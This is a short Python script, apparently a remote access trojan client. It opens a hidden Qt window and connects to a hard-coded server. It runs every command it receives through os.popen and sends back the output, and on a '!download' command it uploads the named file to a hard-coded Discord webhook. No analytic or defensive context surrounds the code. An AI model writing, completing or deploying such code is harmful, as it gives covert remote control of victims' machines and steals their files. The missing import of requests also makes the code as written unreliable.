import socket
import threading
import os
import sys
from PyQt5 import QtWidgets, QtGui, QtCore

# Global variables
server_ip = "10.0.1.33"
server_port = 9999
client_socket = None

# Function to connect to the server
def connect_to_server():
    global client_socket
    
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))
    print("Connected to server")
    
    while True:
        data = client_socket.recv(1024).decode()
        if data.startswith("!download"):
            filename = data.split(" ")[1]
            send_file_to_webhook(filename)
        else:
            execute_command(data)

# Function to send file to Discord webhook
def send_file_to_webhook(filename):
    webhook_url = "https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2"
    with open(filename, "rb") as file:
        requests.post(webhook_url, files={"file": file})
    print("[ * ] Sending...")
    print("[+] Sent!")

# Function to execute shell commands
def execute_command(command):
    result = os.popen(command).read()
    client_socket.send(result.encode())

# Main function
if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    QtWidgets.QWidget().hide()  # Hide the window
    threading.Thread(target=connect_to_server).start()
    sys.exit(app.exec_())
